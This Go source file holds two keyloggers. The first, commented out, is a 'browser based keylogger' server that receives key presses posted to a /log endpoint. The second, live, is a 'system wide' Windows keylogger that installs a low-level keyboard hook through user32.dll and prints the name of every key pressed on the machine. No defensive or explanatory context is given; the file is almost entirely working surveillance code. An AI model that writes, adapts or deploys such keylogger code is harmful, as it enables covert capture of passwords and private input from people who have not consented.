// // Browser based keylogger

// package main

// import (
// 	"encoding/json"
// 	"fmt"
// 	"io"
// 	"net/http"
// )

// type KeyData struct {
// 	Key  string `json:"key"`
// 	Time int64  `json:"time"`
// }

// func logHandler(w http.ResponseWriter, r *http.Request) {
// 	if r.Method != "POST" {
// 		http.Error(w, "Invalid method", http.StatusMethodNotAllowed)
// 		return
// 	}

// 	body, _ := io.ReadAll(r.Body)
// 	defer r.Body.Close()

// 	var data KeyData
// 	json.Unmarshal(body, &data)

// 	fmt.Printf("Key pressed: %s at %d\n", data.Key, data.Time)
// }

// func main() {
// 	http.HandleFunc("/log", logHandler)
// 	http.Handle("/", http.FileServer(http.Dir("static")))

// 	fmt.Println("Server running on :8080")
// 	http.ListenAndServe(":8080", nil)
// }

// system wide kelogger

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	user32               = syscall.MustLoadDLL("user32.dll")
	procSetWindowsHookEx = user32.MustFindProc("SetWindowsHookExW")
	procCallNextHookEx   = user32.MustFindProc("CallNextHookEx")
	procGetMessage       = user32.MustFindProc("GetMessageW")
	procGetKeyNameText   = user32.MustFindProc("GetKeyNameTextW")
)

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
)

type KBDLLHOOKSTRUCT struct {
	vkCode      uint32
	scanCode    uint32
	flags       uint32
	time        uint32
	dwExtraInfo uintptr
}

func getKeyName(scanCode uint32) string {
	var buf [256]uint16
	lparam := uintptr(scanCode << 16)
	procGetKeyNameText.Call(lparam, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	return syscall.UTF16ToString(buf[:])
}

func lowLevelKeyboardProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
	if nCode == 0 && wParam == WM_KEYDOWN {
		kb := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		keyName := getKeyName(kb.scanCode)
		fmt.Printf("Key pressed: %s\n", keyName)
	}
	ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return ret
}

func main() {
	hookProc := syscall.NewCallback(lowLevelKeyboardProc)
	hook, _, _ := procSetWindowsHookEx.Call(WH_KEYBOARD_LL, hookProc, 0, 0)
	if hook == 0 {
		fmt.Println("Failed to set hook")
		return
	}

	var msg struct {
		hwnd           uintptr
		message        uint32
		wParam, lParam uintptr
		time           uint32
		pt             struct{ x, y int32 }
	}
	for {
		procGetMessage.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
	}
}
